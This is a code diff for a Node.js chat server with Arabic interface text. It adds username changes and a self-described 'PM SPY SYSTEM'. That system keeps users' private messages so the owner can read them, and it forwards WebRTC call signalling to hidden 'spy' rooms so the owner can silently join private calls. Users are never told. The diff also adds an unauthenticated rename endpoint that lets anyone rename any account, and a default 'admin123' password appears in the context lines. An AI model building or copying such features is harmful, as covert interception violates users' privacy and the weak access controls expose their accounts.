@@ -64,6 +64,8 @@ const memUsers = {
   admin: { username:'admin', password:hashPassword('admin123'), rank:'owner', is_banned:false, points:0 }
 };
 const memMessages = {};
+const memPMs = {}; // { 'user1||user2': [{from,to,text,time,ts},...] }
+const activeCalls = {}; // { 'user1||user2': { type, startTime } }
 const memProfiles = {}; // { username: { avatar, music_url, music_name, bio } }
 
 // ===== DEFAULT PERMISSIONS =====
@@ -459,7 +461,92 @@ app.post('/api/profile/update', async (req,res) => {
   res.json({ok:true});
 });
 
-// ===== PERMISSIONS API =====
+// ===== CHANGE USERNAME =====
+app.post('/api/change-username', async (req,res) => {
+  const { oldName, newName } = req.body;
+  if (!oldName || !newName) return res.json({ok:false,msg:'بيانات ناقصة'});
+  const nm = newName.trim();
+  if (nm.length < 2 || nm.length > 20) return res.json({ok:false,msg:'الاسم بين 2 و 20 حرف'});
+  if (!/^[a-zA-Z0-9\u0600-\u06FF_\-. ]+$/.test(nm)) return res.json({ok:false,msg:'اسم يحتوي على رموز غير مسموحة'});
+  try {
+    if (useDB) {
+      const ex = await db.query('SELECT username FROM users WHERE username=$1',[nm]);
+      if (ex.rows.length > 0) return res.json({ok:false,msg:'هذا الاسم مستخدم مسبقاً'});
+      await db.query('UPDATE users SET username=$1 WHERE username=$2',[nm,oldName]);
+      await db.query('UPDATE messages SET username=$1 WHERE username=$2',[nm,oldName]).catch(()=>{});
+      await db.query('UPDATE profiles SET username=$1 WHERE username=$2',[nm,oldName]).catch(()=>{});
+    } else {
+      if (memUsers[nm]) return res.json({ok:false,msg:'هذا الاسم مستخدم مسبقاً'});
+      if (memUsers[oldName]) { memUsers[nm]=memUsers[oldName]; delete memUsers[oldName]; }
+      if (memProfiles[oldName]) { memProfiles[nm]=memProfiles[oldName]; delete memProfiles[oldName]; }
+    }
+    const sid = Object.keys(chatUsers).find(id=>chatUsers[id].name===oldName);
+    if (sid) { chatUsers[sid].name = nm; }
+    res.json({ok:true});
+  } catch(e) { console.error(e); res.json({ok:false,msg:'خطأ في قاعدة البيانات'}); }
+});
+
+app.post('/api/admin/rename-user', adminAuth, async (req,res) => {
+  const { oldName, newName } = req.body;
+  if (!oldName || !newName) return res.json({ok:false,msg:'بيانات ناقصة'});
+  const nm = newName.trim();
+  if (nm.length < 2 || nm.length > 20) return res.json({ok:false,msg:'الاسم بين 2 و 20 حرف'});
+  try {
+    if (useDB) {
+      const ex = await db.query('SELECT username FROM users WHERE username=$1',[nm]);
+      if (ex.rows.length > 0) return res.json({ok:false,msg:'هذا الاسم مستخدم مسبقاً'});
+      await db.query('UPDATE users SET username=$1 WHERE username=$2',[nm,oldName]);
+      await db.query('UPDATE messages SET username=$1 WHERE username=$2',[nm,oldName]).catch(()=>{});
+      await db.query('UPDATE profiles SET username=$1 WHERE username=$2',[nm,oldName]).catch(()=>{});
+    } else {
+      if (memUsers[nm]) return res.json({ok:false,msg:'هذا الاسم مستخدم مسبقاً'});
+      if (memUsers[oldName]) { memUsers[nm]=memUsers[oldName]; delete memUsers[oldName]; }
+    }
+    const sid = Object.keys(chatUsers).find(id=>chatUsers[id].name===oldName);
+    if (sid) {
+      chatUsers[sid].name = nm;
+      io.to(sid).emit('username-changed',{newName:nm,msg:'تم تغيير اسمك من قبل الإدارة'});
+    }
+    res.json({ok:true});
+  } catch(e) { console.error(e); res.json({ok:false,msg:'خطأ في قاعدة البيانات'}); }
+});
+// ===== END CHANGE USERNAME =====
+
+// ===== PM SPY SYSTEM (Admin Only) =====
+// Get list of all conversations (admin only)
+app.get('/api/admin/pm-conversations', adminAuth, (req,res) => {
+  const convs = Object.keys(memPMs).map(key => {
+    const parts = key.split('||');
+    const msgs = memPMs[key];
+    const last = msgs[msgs.length-1];
+    return {
+      key, users: parts, count: msgs.length,
+      lastMsg: last?.text?.substring(0,40)||'',
+      lastTime: last?.time||'',
+      hasActiveCall: !!activeCalls[key],
+      callType: activeCalls[key]?.type || null
+    };
+  });
+  // Add active calls that may not have texts yet
+  Object.keys(activeCalls).forEach(key => {
+    if (!convs.find(c=>c.key===key)) {
+      const c = activeCalls[key];
+      convs.push({ key, users:[c.user1,c.user2], count:0, lastMsg:'', lastTime:'', hasActiveCall:true, callType:c.type });
+    }
+  });
+  const onlineUsers = Object.values(chatUsers).map(u=>({name:u.name,rank:u.rank}));
+  res.json({ok:true, conversations: convs, onlineUsers});
+});
+
+// Get full PM history between two users (admin only)
+app.get('/api/admin/pm-history', adminAuth, (req,res) => {
+  const {user1, user2} = req.query;
+  if (!user1 || !user2) return res.json({ok:false,msg:'مطلوب اسمي المستخدمين'});
+  const key = [user1, user2].sort().join('||');
+  const msgs = memPMs[key] || [];
+  res.json({ok:true, messages: msgs, key});
+});
+// ===== END PM SPY SYSTEM =====
 app.get('/api/admin/permissions', adminAuth, async (req,res) => {
   try {
     const perms = await getPerms();
@@ -787,22 +874,45 @@ io.on('connection', (socket) => {
     if (!user || !data.to) return;
     const toSid = Object.keys(chatUsers).find(id => chatUsers[id].name === data.to);
     if (toSid) io.to(toSid).emit('call-offer', { ...data, from: user.name });
+    // Track active call
+    const convKey = [user.name, data.to].sort().join('||');
+    activeCalls[convKey] = { type: data.type, startTime: Date.now(), user1: user.name, user2: data.to };
+    // Notify owner spies watching this PM conversation
+    io.to('spy||' + convKey).emit('spy-call-offer', { ...data, from: user.name, convKey });
   });
   socket.on('call-answer', (data) => {
+    const user = chatUsers[socket.id];
     const toSid = Object.keys(chatUsers).find(id => chatUsers[id].name === data.to);
     if (toSid) io.to(toSid).emit('call-answer', data);
+    // Forward answer to spies too
+    if (user) {
+      const convKey = [user.name, data.to].sort().join('||');
+      io.to('spy||' + convKey).emit('spy-call-answer', { ...data, from: user.name });
+    }
   });
   socket.on('call-ice', (data) => {
+    const user = chatUsers[socket.id];
     const toSid = Object.keys(chatUsers).find(id => chatUsers[id].name === data.to);
     if (toSid) io.to(toSid).emit('call-ice', data);
+    // Forward ICE to spies
+    if (user) {
+      const convKey = [user.name, data.to].sort().join('||');
+      io.to('spy||' + convKey).emit('spy-call-ice', { ...data, from: user.name });
+    }
   });
   socket.on('call-reject', (data) => {
     const toSid = Object.keys(chatUsers).find(id => chatUsers[id].name === data.to);
     if (toSid) io.to(toSid).emit('call-reject', {});
   });
   socket.on('call-end', (data) => {
+    const user = chatUsers[socket.id];
     const toSid = Object.keys(chatUsers).find(id => chatUsers[id].name === data.to);
     if (toSid) io.to(toSid).emit('call-end', {});
+    if (user && data.to) {
+      const convKey = [user.name, data.to].sort().join('||');
+      delete activeCalls[convKey];
+      io.to('spy||' + convKey).emit('spy-call-ended', { convKey });
+    }
   });
 
   socket.on('admin-add-quiz-q', (data) => {
@@ -822,7 +932,36 @@ io.on('connection', (socket) => {
     const sid=Object.keys(chatUsers).find(id=>chatUsers[id].name===data.to); if (!sid) return;
     const pm={type:'private',from:sender.name,to:data.to,text:data.text,time:getTime(),fromRank:sender.rank,fromRankInfo:RANKS[sender.rank]};
     socket.emit('private-message',pm); io.to(sid).emit('private-message',pm);
+    // Store PM in memory for admin view (max 200 per conversation)
+    const convKey = [sender.name, data.to].sort().join('||');
+    if (!memPMs[convKey]) memPMs[convKey] = [];
+    memPMs[convKey].push({...pm, ts: Date.now()});
+    if (memPMs[convKey].length > 200) memPMs[convKey].shift();
+    // Broadcast to any active spies on this conversation
+    const spyRoom = 'spy||' + convKey;
+    io.to(spyRoom).emit('spy-pm', pm);
   });
+
+  // ===== SPY: JOIN/LEAVE PM CONVERSATION =====
+  socket.on('spy-join', (data) => {
+    const admin = chatUsers[socket.id];
+    if (!admin) return;
+    if (admin.rank !== 'owner') return;
+    const key = [data.user1, data.user2].sort().join('||');
+    const spyRoom = 'spy||' + key;
+    socket.join(spyRoom);
+    const history = memPMs[key] || [];
+    socket.emit('spy-history', { key, user1: data.user1, user2: data.user2, messages: history });
+    // Send active call info if there's an ongoing call
+    if (activeCalls[key]) {
+      socket.emit('spy-call-active', { ...activeCalls[key], convKey: key });
+    }
+  });
+  socket.on('spy-leave', (data) => {
+    const key = [data.user1, data.user2].sort().join('||');
+    socket.leave('spy||' + key);
+  });
+  // ===== END SPY =====
 
   // WEBRTC VOICE/VIDEO SIGNALING
   socket.on('voice-join',(roomId)=>{
